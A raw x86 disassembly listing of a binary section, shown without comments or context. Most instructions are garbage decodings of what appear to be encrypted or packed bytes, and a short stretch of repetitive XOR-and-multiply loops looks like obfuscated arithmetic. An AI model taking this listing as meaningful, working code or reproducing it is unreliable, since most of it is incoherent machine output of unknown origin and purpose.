  405948:	mov    dl,0x27
  40594a:	enter  0x5312,0xa0
  40594e:	dec    esi
  40594f:	pusha  
  405950:	push   cs
  405951:	push   0x5c
  405953:	call   0xec456273
  405958:	lods   eax,DWORD PTR ds:[esi]
  405959:	int3   
  40595a:	dec    edi
  40595b:	sub    ecx,ebx
  40595d:	(bad)  
  40595f:	lock vpmacsdql ymm8,ymm0,ymm6,YMMWORD PTR [edx-0x6ee5b4ac]
  40596a:	xchg   BYTE PTR [ecx-0x60],dl
  40596d:	dec    ecx
  40596e:	out    0xf9,al
  405970:	sub    al,0x2d
  405972:	cmc    
  405973:	cdq    
  405974:	adc    eax,0x734f1d1d
  405979:	xor    ch,BYTE PTR [eax]
  40597b:	in     al,dx
  40597c:	fwait
  40597d:	jmp    0x739a:0x7baa0e24
  405984:	ins    BYTE PTR es:[edi],dx
  405985:	js     0x405945
  405987:	and    al,0xaf
  405989:	popf   
  40598a:	inc    edx
  40598b:	adc    ch,ch
  40598d:	jbe    0x40592b
  40598f:	xor    al,0xd9
  405991:	pextrw ecx,mm2,0xbd
  405995:	outs   dx,BYTE PTR ds:[esi]
  405996:	retf   0x50e4
  405999:	outs   dx,DWORD PTR ds:[esi]
  40599a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40599b:	adc    edi,eax
  40599d:	mov    bh,0xfa
  40599f:	stos   DWORD PTR es:[edi],eax
  4059a0:	mov    DWORD PTR [esi+0x1d],0x747c06f8
  4059a7:	xchg   esi,eax
  4059a8:	sar    al,1
  4059aa:	leave  
  4059ab:	cmp    al,0xb5
  4059ad:	inc    esi
  4059ae:	loop   0x4059c5
  4059b0:	fwait
  4059b1:	xchg   DWORD PTR [esi],eax
  4059b3:	adc    eax,0x51f8daf9
  4059b8:	pop    esp
  4059b9:	cmp    bh,BYTE PTR [ebx+edi*2+0x2a251622]
  4059c0:	lahf   
  4059c1:	xor    BYTE PTR [edi],cl
  4059c3:	pop    edx
  4059c4:	jmp    FWORD PTR [ecx-0x14b78654]
  4059ca:	int3   
  4059cb:	fimul  DWORD PTR [esi-0x4c]
  4059ce:	xor    eax,DWORD PTR [ebp-0x267c4af5]
  4059d4:	mov    BYTE PTR ds:0xc3ca33b9,bl
  4059da:	jecxz  0x405984
  4059dc:	repnz xchg esp,eax
  4059de:	dec    ebp
  4059df:	stc    
  4059e0:	push   ebx
  4059e1:	and    cl,al
  4059e3:	mov    cs,WORD PTR [esi+ecx*2]
  4059e6:	inc    ecx
  4059e7:	inc    edx
  4059e8:	ret    
  4059e9:	in     al,dx
  4059ea:	fs inc esp
  4059ec:	mov    eax,0xd27c4028
  4059f1:	shr    DWORD PTR [esi+0x5609d080],1
  4059f7:	add    cl,BYTE PTR [ecx+0x44]
  4059fa:	in     al,dx
  4059fb:	scas   eax,DWORD PTR es:[edi]
  4059fc:	mov    al,ds:0x31219ff7
  405a01:	ds in  eax,dx
  405a03:	mov    ds:0x832ddfe2,al
  405a08:	pusha  
  405a09:	cmp    bh,BYTE PTR [ecx+0x52ad5f8f]
  405a0f:	(bad)  
  405a10:	cmp    ah,BYTE PTR [edi+0x36]
  405a13:	xor    DWORD PTR [ecx],edi
  405a15:	mov    cs,WORD PTR [edi]
  405a17:	dec    edx
  405a18:	jbe    0x4059cb
  405a1a:	sbb    DWORD PTR [ecx+0x33],ebx
  405a1d:	xchg   edx,eax
  405a1e:	in     al,0x9c
  405a20:	out    0xcc,eax
  405a22:	jmp    0x7493:0x32fcc895
  405a29:	lahf   
  405a2a:	cdq    
  405a2b:	je     0x405a77
  405a2d:	push   ds
  405a2e:	and    al,0xd
  405a30:	push   ds
  405a31:	push   0x6
  405a33:	sbb    bl,al
  405a35:	push   0xb3daa30f
  405a3a:	mov    WORD PTR [ebp-0x5dee54aa],cs
  405a40:	push   ecx
  405a41:	bound  edi,QWORD PTR [edi+0x3650203f]
  405a47:	dec    esp
  405a48:	adc    eax,0x9f905363
  405a4d:	add    dl,ah
  405a4f:	int    0xfd
  405a51:	inc    ebp
  405a52:	call   0xd076:0x41ce8f0a
  405a59:	mov    dh,0x7c
  405a5b:	mov    bh,0x4f
  405a5d:	mov    esi,0xea5b10c4
  405a62:	gs mov dh,0xb2
  405a65:	push   edx
  405a66:	adc    edx,DWORD PTR [ecx-0x5a101dba]
  405a6c:	or     ebp,DWORD PTR [esp+ebp*1-0x78e59862]
  405a73:	ja     0x405aa8
  405a75:	std    
  405a76:	mov    ah,0xe0
  405a78:	xchg   esp,eax
  405a79:	pusha  
  405a7a:	jnp    0x405aa6
  405a7c:	or     DWORD PTR [eax+0x5bf8be48],ebx
  405a82:	loope  0x405a91
  405a84:	enter  0x12a9,0x5e
  405a88:	int    0x29
  405a8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a8b:	nop
  405a8c:	test   al,0x96
  405a8e:	lods   eax,DWORD PTR ds:[esi]
  405a8f:	dec    esp
  405a90:	shl    DWORD PTR [esi],0x4
  405a93:	or     eax,eax
  405a95:	cmp    eax,0x2eb5c105
  405a9a:	das    
  405a9b:	test   eax,0xf281feff
  405aa0:	out    0xb7,eax
  405aa2:	pop    ecx
  405aa3:	dec    edi
  405aa4:	imul   DWORD PTR [edx-0x32c40e18]
  405aaa:	jb     0x405aa3
  405aac:	sub    eax,0x11e14e1c
  405ab1:	fwait
  405ab2:	mov    eax,0x22bf27e1
  405ab7:	test   eax,0x9386b99e
  405abc:	addr16 sub bh,bh
  405abf:	mov    dl,0xe6
  405ac1:	mov    BYTE PTR [ecx],0x7a
  405ac4:	pop    ds
  405ac5:	dec    ebx
  405ac6:	out    dx,al
  405ac7:	fwait
  405ac8:	mov    ebx,0x1298c231
  405acd:	jmp    0x405acd
  405acf:	cmc    
  405ad0:	rol    ebx,0x58
  405ad3:	loopne 0x405a6e
  405ad5:	into   
  405ad6:	add    al,0x1b
  405ad8:	and    eax,0xd2087fc8
  405add:	jbe    0x405a6f
  405adf:	and    esp,eax
  405ae1:	rol    DWORD PTR [ecx+0x6c],cl
  405ae4:	stc    
  405ae5:	or     edi,DWORD PTR [edx]
  405ae7:	xchg   esp,eax
  405ae8:	and    DWORD PTR [edi],eax
  405aea:	dec    edx
  405aeb:	scas   eax,DWORD PTR es:[edi]
  405aec:	pop    edx
  405aed:	push   es
  405aee:	jns    0x405b14
  405af0:	loopne 0x405ab1
  405af2:	test   al,0x42
  405af4:	mov    dl,0xd6
  405af6:	jmp    0x2eaad4b
  405afb:	fdivr  DWORD PTR [esi]
  405afd:	or     DWORD PTR cs:0x7aa5735c,esp
  405b04:	sub    eax,0xcc80567b
  405b09:	mov    BYTE PTR [esi+0xf52f6b6],bl
  405b0f:	xchg   ebp,eax
  405b10:	pop    es
  405b11:	mov    ds:0x6ca6fd75,eax
  405b16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b17:	leave  
  405b18:	xor    ebx,DWORD PTR [ebp+0x18]
  405b1b:	inc    edx
  405b1c:	(bad)  
  405b1d:	cdq    
  405b1e:	pushaw 
  405b20:	mov    esp,0x836fe641
  405b25:	in     al,dx
  405b26:	addr16 sub bl,ch
  405b29:	adc    DWORD PTR [esi+0x4f],esi
  405b2c:	mov    bh,0xe8
  405b2e:	inc    ebx
  405b2f:	inc    esi
  405b30:	mov    DWORD PTR [ebp+0x43839f1b],ebx
  405b36:	push   ds
  405b37:	pushf  
  405b38:	rcr    DWORD PTR [ebp-0x9e82f38],0x64
  405b3f:	fmul   DWORD PTR [esi]
  405b41:	pop    ebx
  405b42:	outs   dx,DWORD PTR ds:[esi]
  405b43:	mov    BYTE PTR [esi-0x17e0cf56],bl
  405b49:	fsqrt  
  405b4b:	bound  eax,QWORD PTR [ecx+0x5b3166c9]
  405b51:	jmp    0x405bc2
  405b53:	enter  0xb93d,0x6e
  405b57:	xchg   edx,eax
  405b58:	ret    
  405b59:	(bad)  
  405b5a:	xchg   esp,eax
  405b5b:	outs   dx,DWORD PTR ds:[esi]
  405b5c:	cmp    ebp,DWORD PTR [ecx]
  405b5e:	dec    edx
  405b5f:	dec    ebp
  405b60:	mov    BYTE PTR [ecx],bl
  405b62:	jg     0x405b88
  405b64:	stos   DWORD PTR es:[edi],eax
  405b65:	inc    eax
  405b66:	in     al,dx
  405b67:	mov    dh,0x52
  405b69:	jecxz  0x405bb9
  405b6b:	fist   DWORD PTR [edi+eax*4]
  405b6e:	cmp    bl,cl
  405b70:	pusha  
  405b71:	mov    BYTE PTR [edx],ch
  405b73:	and    eax,0x4c9f1eec
  405b78:	mov    ch,0x69
  405b7a:	gs jle 0x405be1
  405b7d:	sbb    BYTE PTR [ecx-0x53579b68],0xd0
  405b84:	cmp    DWORD PTR [eax+0x62],ecx
  405b87:	(bad)  
  405b88:	(bad)  
  405b89:	adc    al,0xf7
  405b8b:	rcl    DWORD PTR [edx],cl
  405b8d:	add    BYTE PTR [ecx+edx*2],bl
  405b90:	popa   
  405b91:	sbb    dh,ah
  405b93:	pop    es
  405b94:	leave  
  405b95:	idiv   BYTE PTR [edi-0x29acd219]
  405b9b:	xor    eax,ecx
  405b9d:	xchg   edx,eax
  405b9e:	lea    edi,[edi+0x589c7138]
  405ba4:	xchg   edi,eax
  405ba5:	xchg   ebx,eax
  405ba6:	addr16 mov esi,0x5e5c257f
  405bac:	mov    DWORD PTR [edx],esp
  405bae:	data16 clc 
  405bb0:	dec    esi
  405bb1:	inc    esi
  405bb2:	jle    0x405b70
  405bb4:	xchg   edx,eax
  405bb5:	inc    esi
  405bb6:	ss jg  0x405b89
  405bb9:	(bad)  
  405bbb:	xor    al,0x85
  405bbd:	sti    
  405bbe:	std    
  405bbf:	int    0x4b
  405bc1:	imul   ecx,DWORD PTR [ecx-0x8],0x299b4718
  405bc8:	enter  0xe888,0x94
  405bcc:	xlat   BYTE PTR ds:[ebx]
  405bcd:	outs   dx,BYTE PTR ds:[esi]
  405bce:	fstp   st(3)
  405bd0:	mov    bl,0xa7
  405bd2:	pop    eax
  405bd3:	fnsave [esi+esi*4]
  405bd6:	out    0x1a,eax
  405bd8:	pop    ss
  405bd9:	outs   dx,BYTE PTR ds:[esi]
  405bda:	and    al,0x89
  405bdc:	outs   dx,DWORD PTR ds:[esi]
  405bdd:	xchg   BYTE PTR [edx-0x3351c699],cl
  405be3:	sbb    dh,BYTE PTR ds:0x84bb20d2
  405be9:	es add al,0x31
  405bec:	sub    al,ah
  405bee:	xchg   dh,dh
  405bf0:	imul   DWORD PTR [edx]
  405bf2:	hlt    
  405bf3:	jne    0x405b89
  405bf5:	rcr    BYTE PTR [edx],1
  405bf7:	push   ds
  405bf8:	or     DWORD PTR [ebx-0x42],esi
  405bfb:	add    al,0x6a
  405bfd:	les    esp,FWORD PTR [ebx]
  405bff:	push   0xffffffbd
  405c01:	push   ebx
  405c02:	sahf   
  405c03:	inc    ecx
  405c04:	xchg   ebp,eax
  405c05:	adc    BYTE PTR [eax+0x73cd185c],cl
  405c0b:	inc    eax
  405c0c:	mov    ah,0xb
  405c0e:	pop    edx
  405c0f:	cmp    dh,BYTE PTR [ebp+edi*1-0x6e693154]
  405c16:	inc    eax
  405c17:	inc    ecx
  405c18:	daa    
  405c19:	sbb    cl,BYTE PTR [ebx-0x3ec545d5]
  405c1f:	mov    ah,0x4a
  405c21:	inc    BYTE PTR [eax-0x3d7f60d1]
  405c27:	lods   eax,DWORD PTR ds:[esi]
  405c28:	and    al,0x2d
  405c2a:	add    al,0x74
  405c2c:	call   0x592240a4
  405c31:	and    eax,0x4fbf7e94
  405c36:	fs test eax,0xad60ea5d
  405c3c:	popa   
  405c3d:	mov    ah,0x90
  405c3f:	es cmp edx,DWORD PTR ss:[esi-0x7e]
  405c44:	retf   0x584f
  405c47:	jno    0x405c50
  405c49:	add    al,0x5b
  405c4b:	xchg   edx,eax
  405c4c:	ss scas al,BYTE PTR es:[edi]
  405c4e:	loopne 0x405cb5
  405c50:	or     al,0x89
  405c52:	jle    0x405c8a
  405c54:	xchg   DWORD PTR [ebx-0x22],edx
  405c57:	or     bl,BYTE PTR [ecx+0x7de81771]
  405c5d:	adc    BYTE PTR [ebx+0x63],ah
  405c60:	push   edx
  405c61:	mov    edi,0x33d80830
  405c66:	adc    eax,0xd2590296
  405c6b:	test   eax,0x84f8effd
  405c70:	mov    fs,WORD PTR [ebp+0x7c]
  405c73:	cmp    al,0xcd
  405c75:	xor    eax,0x370d0db4
  405c7a:	fadd   QWORD PTR [ebx-0x51]
  405c7d:	adc    cl,bl
  405c7f:	daa    
  405c80:	fbstp  TBYTE PTR [edx]
  405c82:	sbb    al,0x96
  405c84:	addr16 out 0x25,al
  405c87:	es rol eax,0x28
  405c8b:	pop    eax
  405c8c:	xor    al,0xd5
  405c8e:	fsubr  QWORD PTR [eax+0x7]
  405c91:	jnp    0x405ccc
  405c93:	adc    edx,DWORD PTR [edi]
  405c95:	add    bl,BYTE PTR [esi]
  405c97:	add    BYTE PTR [ecx+0x200a12d1],cl
  405c9d:	and    al,ah
  405c9f:	adc    DWORD PTR [eax-0x17],ecx
  405ca2:	in     al,dx
  405ca3:	call   0x40770cca
  405ca8:	ja     0x405c3b
  405caa:	cld    
  405cab:	add    eax,DWORD PTR [edi+0x371bff27]
  405cb1:	cmp    BYTE PTR [eax+0x4d3e3233],dh
  405cb7:	arpl   WORD PTR [eax-0x50b09527],bp
  405cbd:	push   ss
  405cbe:	je     0x405c83
  405cc0:	mov    ebp,ebx
  405cc2:	iret   
  405cc3:	inc    ebp
  405cc4:	nop
  405cc5:	jb     0x405d19
  405cc7:	imul   ebp,esp,0xbaab1657
  405ccd:	cmp    al,0xf8
  405ccf:	pusha  
  405cd0:	outs   dx,BYTE PTR ds:[esi]
  405cd1:	sub    BYTE PTR [ebx-0x66],bh
  405cd4:	push   es
  405cd5:	add    eax,0x4dcc119d
  405cda:	fidivr WORD PTR [esi-0x1a]
  405cdd:	and    al,0x4
  405cdf:	ss inc esp
  405ce1:	lea    edi,[esi]
  405ce3:	or     eax,0xd09976e9
  405ce8:	xlat   BYTE PTR ds:[ebx]
  405ce9:	mov    edi,0xf2789058
  405cee:	adc    eax,0x5f15406e
  405cf3:	sbb    al,0x50
  405cf5:	mov    ds:0xd83d0407,al
  405cfa:	dec    ebx
  405cfb:	or     BYTE PTR [edi],ch
  405cfd:	lds    eax,FWORD PTR [ebx+edi*4-0x2b71dc6a]
  405d04:	aad    0x62
  405d06:	pop    esp
  405d07:	mov    bl,BYTE PTR [ebx+0x75]
  405d0a:	mov    edi,0x8de62929
  405d0f:	cli    
  405d10:	shl    DWORD PTR [eax],1
  405d12:	dec    esi
  405d13:	(bad)  
  405d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d15:	xchg   esi,eax
  405d16:	sub    ebx,0x8fb6be8f
  405d1c:	data16 cmp BYTE PTR [ebx+0x17f03170],ch
  405d23:	sub    DWORD PTR [ecx-0x558b0e26],ebx
  405d29:	iret   
  405d2a:	push   edi
  405d2b:	dec    ebx
  405d2c:	xor    BYTE PTR [ebx],bh
  405d2e:	fimul  DWORD PTR [ebp+0x65282296]
  405d34:	and    BYTE PTR [edx+esi*1-0x558f0da0],bl
  405d3b:	je     0x405db8
  405d3d:	das    
  405d3e:	mov    edx,0x123ea2a6
  405d43:	push   esp
  405d44:	xchg   ecx,eax
  405d45:	jns    0x405cc9
  405d47:	in     al,dx
  405d48:	mov    cs:0x8334688d,eax
  405d4e:	mov    esi,0xa60e3f80
  405d53:	cmc    
  405d54:	fwait
  405d55:	pop    ss
  405d56:	mov    WORD PTR [edx+0x7cf800c3],ds
  405d5c:	sbb    edx,DWORD PTR [edi]
  405d5e:	jle    0x405d9b
  405d60:	les    esp,FWORD PTR [eax]
  405d62:	dec    edx
  405d63:	inc    ebx
  405d64:	and    eax,DWORD PTR [ecx]
  405d66:	mov    edx,0xa9cb761
  405d6b:	and    DWORD PTR [esi+0x5d],esi
  405d6e:	test   BYTE PTR [eax],dl
  405d70:	sbb    DWORD PTR [eax+0xe987a03],0x20
  405d77:	mov    bh,0x2
  405d79:	push   ds
  405d7a:	(bad)  
  405d7b:	repz sbb dl,dl
  405d7e:	pusha  
  405d7f:	inc    ebx
  405d80:	loop   0x405d8d
  405d82:	out    0xd0,al
  405d84:	clc    
  405d85:	leave  
  405d86:	push   ebx
  405d87:	mov    ebp,0x609e30ca
  405d8c:	adc    cl,bh
  405d8e:	sbb    BYTE PTR [edi+0x51],ah
  405d91:	cmp    eax,DWORD PTR [ebx+0x21faae3e]
  405d97:	sbb    DWORD PTR ds:0x74ddcf27,esi
  405d9d:	mov    ebx,0xba88a8a8
  405da2:	xor    al,0x50
  405da4:	push   esp
  405da5:	mov    edx,0x844fbec2
  405daa:	ins    DWORD PTR es:[edi],dx
  405dab:	sbb    al,0x5
  405dad:	sbb    eax,DWORD PTR [edi+0x5c]
  405db0:	xlat   BYTE PTR ds:[ebx]
  405db1:	mov    eax,0x20e60b26
  405db6:	rcr    dl,cl
  405db8:	xchg   edx,eax
  405db9:	stos   DWORD PTR es:[edi],eax
  405dba:	(bad)  
  405dbb:	and    ebp,DWORD PTR [edi]
  405dbd:	jge    0x405e0a
  405dbf:	fcmovu st,st(7)
  405dc1:	jae    0x405e13
  405dc3:	lds    esp,FWORD PTR [ecx]
  405dc5:	add    eax,0x9d7bc657
  405dca:	push   es
  405dcb:	jno    0x405d7d
  405dcd:	inc    esp
  405dce:	outs   dx,DWORD PTR ds:[esi]
  405dcf:	cmp    BYTE PTR [edi],cl
  405dd1:	xchg   ebp,eax
  405dd2:	xlat   BYTE PTR ds:[ebx]
  405dd3:	pop    eax
  405dd4:	sub    esp,ecx
  405dd6:	mov    eax,ds:0x15870367
  405ddb:	and    eax,0x24db069b
  405de0:	mov    ds:0xcfd52da7,al
  405de5:	fistp  DWORD PTR [edx+0x74be829a]
  405deb:	mov    eax,ds:0x8c406828
  405df0:	cwde   
  405df1:	and    eax,0x472e42e8
  405df6:	lar    esi,WORD PTR [esi-0x6f]
  405dfa:	int3   
  405dfb:	dec    esp
  405dfc:	cmp    bh,bl
  405dfe:	rcr    DWORD PTR [ebx],cl
  405e00:	mov    ebp,0xfb4b211b
  405e05:	sar    DWORD PTR [esi+eiz*1+0xc],1
  405e09:	ss iret 
  405e0b:	xlat   BYTE PTR ds:[ebx]
  405e0c:	jle    0x405de8
  405e0e:	pop    edx
  405e0f:	lods   eax,DWORD PTR ds:[esi]
  405e10:	xor    cl,ch
  405e12:	push   esp
  405e13:	div    BYTE PTR [edi+esi*8-0x6669d5c]
  405e1a:	into   
  405e1b:	(bad)  
  405e1d:	mov    esi,0x97d82b08
  405e22:	out    dx,eax
  405e23:	daa    
  405e24:	or     eax,0x2d347ae3
  405e29:	fchs   
  405e2b:	jg     0x405e29
  405e2d:	cmp    dl,dl
  405e2f:	sub    al,0xb1
  405e31:	push   ds
  405e32:	arpl   WORD PTR [edi+0x698e4c42],sp
  405e38:	retf   0x2796
  405e3b:	dec    ebp
  405e3c:	loop   0x405e02
  405e3e:	sti    
  405e3f:	pop    edx
  405e40:	add    DWORD PTR [ebp-0x6a],ebx
  405e43:	lods   al,BYTE PTR ds:[esi]
  405e44:	ret    0x3223
  405e47:	pop    esi
  405e48:	xlat   BYTE PTR ds:[ebx]
  405e49:	repz stc 
  405e4b:	cs (bad) 
  405e4d:	fstp   QWORD PTR [edx+0x4804d445]
  405e53:	add    BYTE PTR [ecx+eax*1-0x6382d095],0xd0
  405e5b:	or     eax,0x504639fb
  405e60:	in     al,0x75
  405e62:	repnz push ss
  405e64:	jo     0x405e35
  405e66:	pop    ebp
  405e67:	push   esp
  405e68:	dec    ecx
  405e69:	jle    0x405dfb
  405e6b:	(bad)  
  405e6c:	sti    
  405e6d:	inc    esp
  405e6e:	mov    DWORD PTR [edx+0xb8ab139],eax
  405e74:	xor    al,0xa4
  405e76:	pop    ss
  405e77:	pop    esp
  405e78:	push   edx
  405e79:	jno    0x405e0d
  405e7b:	mov    edi,0x8b22dc1f
  405e80:	and    ecx,DWORD PTR [eax+0x6ffb836]
  405e86:	mov    ds:0x2321daa3,eax
  405e8b:	dec    esi
  405e8c:	xchg   edx,eax
  405e8d:	pushf  
  405e8e:	pushf  
  405e8f:	pop    edx
  405e90:	enter  0xe37c,0x1
  405e94:	loopne 0x405e74
  405e96:	stos   DWORD PTR es:[edi],eax
  405e97:	push   eax
  405e98:	rcl    BYTE PTR [esi],cl
  405e9a:	test   al,0x5f
  405e9c:	push   cs
  405e9d:	xor    esp,esi
  405e9f:	daa    
  405ea0:	dec    edi
  405ea1:	mov    es:0xb4ab2477,eax
  405ea7:	bound  esi,QWORD PTR [edx-0x3e]
  405eaa:	xor    BYTE PTR [ebx],bh
  405eac:	push   es
  405ead:	xor    eax,DWORD PTR [edi+ebx*1-0x9]
  405eb1:	push   esi
  405eb2:	mov    es,WORD PTR [esi]
  405eb4:	mov    ah,0x2a
  405eb6:	cmp    esp,DWORD PTR [ecx]
  405eb8:	cwde   
  405eb9:	inc    edx
  405eba:	cmp    al,BYTE PTR [edi+0x47ee34cb]
  405ec0:	ficom  DWORD PTR [ecx+0x21]
  405ec3:	add    esp,DWORD PTR [esi]
  405ec5:	pop    ecx
  405ec6:	aas    
  405ec7:	inc    edx
  405ec8:	fcmovbe st,st(2)
  405eca:	je     0x405ef3
  405ecc:	ror    DWORD PTR [ebp-0x20],1
  405ecf:	jmp    0x960d:0x3d421ed5
  405ed6:	pop    es
  405ed7:	test   DWORD PTR [eax],esi
  405ed9:	push   esi
  405eda:	bound  eax,QWORD PTR [edx]
  405edc:	pop    edi
  405edd:	and    esp,DWORD PTR [ebp+ebx*8-0x59]
  405ee1:	adc    DWORD PTR [eax+ecx*2-0x5b],eax
  405ee5:	inc    esi
  405ee6:	cmc    
  405ee7:	rcl    BYTE PTR [eax+0x649418e],0xa2
  405eee:	dec    esi
  405eef:	fmul   DWORD PTR [ebx]
  405ef1:	out    0xbb,eax
  405ef3:	xchg   esi,eax
  405ef4:	adc    cl,BYTE PTR [edx]
  405ef6:	fild   DWORD PTR [edx-0x580c8f1d]
  405efc:	inc    eax
  405efd:	mov    eax,0x2d35cf45
  405f02:	daa    
  405f03:	mov    al,0x8
  405f05:	xor    eax,0xc9b14c03
  405f0a:	fld    DWORD PTR [edx]
  405f0c:	adc    esp,esp
  405f0e:	push   edx
  405f0f:	outs   dx,DWORD PTR ds:[esi]
  405f10:	imul   BYTE PTR [edi]
  405f12:	cli    
  405f13:	and    eax,0x37596c62
  405f18:	mov    DWORD PTR [ecx-0x4f85a85e],edx
  405f1e:	push   edx
  405f1f:	jle    0x405f14
  405f21:	mov    ?,WORD PTR [eax]
  405f23:	addr16 cld 
  405f25:	pop    es
  405f26:	repnz test al,0x39
  405f29:	mov    bh,0x10
  405f2b:	lods   eax,DWORD PTR ds:[esi]
  405f2c:	xchg   esi,eax
  405f2e:	xchg   ecx,eax
  405f2f:	mov    bh,0x8b
  405f31:	push   ebp
  405f32:	or     BYTE PTR [ebx],dh
  405f34:	rol    BYTE PTR [ecx-0x1],1
  405f37:	inc    ebp
  405f38:	call   0xca7c3540
  405f3d:	jb     0x403b83
  405f43:	jmp    0x405f8d
  405f48:	mov    ecx,DWORD PTR [ebp-0xc]
  405f4b:	mov    DWORD PTR [ebp+0x8],ecx
  405f4e:	jmp    0x405f80
  405f53:	mov    ecx,DWORD PTR [ebp+0x8]
  405f56:	mov    edx,DWORD PTR [ebp-0x8]
  405f59:	xor    ecx,eax
  405f5b:	xor    edx,eax
  405f5d:	sub    ecx,edx
  405f5f:	sub    ecx,esi
  405f61:	xor    ecx,eax
  405f63:	mov    DWORD PTR [ebp+0x8],ecx
  405f66:	mov    ecx,DWORD PTR [ebp+0x8]
  405f69:	mov    edx,DWORD PTR [ebp+0x8]
  405f6c:	imul   edx,edx,0x5708f5
  405f72:	xor    ecx,eax
  405f74:	add    ecx,esi
  405f76:	lea    ecx,[ebp+ecx*4-0x64]
  405f7a:	mov    edi,DWORD PTR [ecx]
  405f7c:	add    edx,edi
  405f7e:	mov    DWORD PTR [ecx],edx
  405f80:	mov    ecx,DWORD PTR [ebp+0x8]
  405f83:	xor    ecx,eax
  405f85:	add    ecx,esi
  405f87:	jne    0x405f53
  405f8d:	mov    ecx,DWORD PTR [ebp-0xc]
  405f90:	mov    DWORD PTR [ebp+0x8],ecx
  405f93:	jmp    0x405fc5
  405f98:	mov    ecx,DWORD PTR [ebp+0x8]
  405f9b:	mov    edx,DWORD PTR [ebp-0x8]
  405f9e:	xor    ecx,eax
  405fa0:	xor    edx,eax
  405fa2:	sub    ecx,edx
  405fa4:	sub    ecx,esi
  405fa6:	xor    ecx,eax
  405fa8:	mov    DWORD PTR [ebp+0x8],ecx
  405fab:	mov    ecx,DWORD PTR [ebp+0x8]
  405fae:	mov    edx,DWORD PTR [ebp+0x8]
  405fb1:	imul   edx,edx,0x5708f5
  405fb7:	xor    ecx,eax
  405fb9:	add    ecx,esi
  405fbb:	lea    ecx,[ebp+ecx*4-0x64]
  405fbf:	mov    edi,DWORD PTR [ecx]
  405fc1:	add    edx,edi
  405fc3:	mov    DWORD PTR [ecx],edx
  405fc5:	mov    ecx,DWORD PTR [ebp+0x8]
  405fc8:	xor    ecx,eax
  405fca:	add    ecx,esi
  405fcc:	jne    0x405f98
  405fd2:	mov    ecx,DWORD PTR [ebp-0x8]
  405fd5:	mov    edx,DWORD PTR [ebp-0x20]
  405fd8:	xor    ecx,eax
  405fda:	lea    ecx,[ecx+edx*1+0x3272db]
  405fe1:	mov    DWORD PTR [ebp-0x20],ecx
  405fe4:	inc    DWORD PTR [ebp+0xc]
  405fe7:	mov    ecx,DWORD PTR [ebp-0x1c]
  405fea:	xor    ecx,eax
  405fec:	add    ecx,esi
  405fee:	jne    0x401627
  405ff4:	jmp    0x40607d
  405ff9:	mov    ecx,DWORD PTR [ebp-0xc]
  405ffc:	mov    DWORD PTR [ebp+0x8],ecx
  405fff:	jmp    0x406031
  406004:	mov    ecx,DWORD PTR [ebp+0x8]
  406007:	mov    edx,DWORD PTR [ebp-0x8]
  40600a:	xor    ecx,eax
  40600c:	xor    edx,eax
  40600e:	sub    ecx,edx
  406010:	sub    ecx,esi
  406012:	xor    ecx,eax
  406014:	mov    DWORD PTR [ebp+0x8],ecx
  406017:	mov    ecx,DWORD PTR [ebp+0x8]
  40601a:	mov    edx,DWORD PTR [ebp+0x8]
  40601d:	imul   edx,edx,0x5708f5
  406023:	xor    ecx,eax
  406025:	add    ecx,esi
  406027:	lea    ecx,[ebp+ecx*4-0x64]
  40602b:	mov    edi,DWORD PTR [ecx]
  40602d:	add    edx,edi
  40602f:	mov    DWORD PTR [ecx],edx
  406031:	mov    ecx,DWORD PTR [ebp+0x8]
  406034:	xor    ecx,eax
  406036:	add    ecx,esi
  406038:	jne    0x406004
  40603e:	jmp    0x406089
  406043:	mov    ecx,DWORD PTR [ebp+0x8]
  406046:	mov    edx,DWORD PTR [ebp-0x8]
  406049:	xor    ecx,eax
  40604b:	xor    edx,eax
  40604d:	sub    ecx,edx
  40604f:	sub    ecx,esi
  406051:	xor    ecx,eax
  406053:	mov    DWORD PTR [ebp+0x8],ecx
  406056:	mov    ecx,DWORD PTR [ebp+0x8]
  406059:	mov    edx,DWORD PTR [ebp+0x8]
  40605c:	xor    ecx,eax
  40605e:	imul   edx,edx,0x5708f5
  406064:	add    ecx,esi
  406066:	lea    ecx,[ebp+ecx*4-0x64]
  40606a:	mov    edi,DWORD PTR [ecx]
  40606c:	add    edx,edi
  40606e:	mov    DWORD PTR [ecx],edx
  406070:	mov    ecx,DWORD PTR [ebp+0x8]
  406073:	xor    ecx,eax
  406075:	add    ecx,esi
  406077:	jne    0x406043
  40607d:	mov    ecx,DWORD PTR [ebp-0x8]
  406080:	xor    ecx,eax
  406082:	mov    eax,DWORD PTR [ebp+0x10]
  406085:	add    ecx,esi
  406087:	mov    DWORD PTR [eax],ecx
  406089:	pop    edi
  40608a:	jmp    0x40840d
  40608f:	inc    edx
  406090:	push   0x14
  406092:	add    DWORD PTR [ebx+ebp*2+0x53],esp
  406096:	imul   eax,esi,0x35a0f463
  40609c:	adc    DWORD PTR [eax],edx
  40609e:	add    DWORD PTR [esi+0x1c62623c],esi
  4060a4:	pop    edi
  4060a5:	bound  esp,QWORD PTR [edx+0x31]
  4060a8:	fwait
  4060a9:	mov    bh,0x84
  4060ab:	lods   eax,DWORD PTR ds:[esi]
  4060ac:	push   cs
  4060ad:	mov    ch,0xcf
  4060af:	mov    ebx,DWORD PTR [edi+0x20cf1a49]
  4060b5:	aam    0xdf
  4060b7:	outs   dx,DWORD PTR ds:[esi]
  4060b8:	sbb    eax,0xc379d9a4
  4060bd:	mov    dl,0xb3
  4060bf:	sbb    eax,0xf9f4e11d
  4060c4:	pusha  
  4060c5:	cdq    
  4060c6:	lahf   
  4060c7:	mov    ebx,0xdd4b0a6b
  4060cc:	or     dh,BYTE PTR [ebx+0x3a6e3a18]
  4060d2:	bound  ebx,QWORD PTR [edx+0x19]
  4060d5:	cwde   
  4060d6:	aaa    
  4060d7:	rol    DWORD PTR [ecx-0xf],0x4d
  4060db:	xchg   edi,eax
  4060dc:	mov    ds:0x1e75c21c,eax
  4060e1:	pop    esp
  4060e2:	push   ds
  4060e3:	imul   ebp,DWORD PTR [ecx],0xffffffb1
  4060e6:	ins    BYTE PTR es:[edi],dx
  4060e7:	imul   edi,DWORD PTR [edx-0x2c2cdcb0],0x7c
  4060ee:	fstp   TBYTE PTR [esi+eiz*1]
  4060f1:	outs   dx,DWORD PTR ds:[esi]
  4060f2:	sti    
  4060f3:	in     eax,0x77
  4060f5:	push   eax
  4060f6:	mov    DWORD PTR [edx+0x47],esi
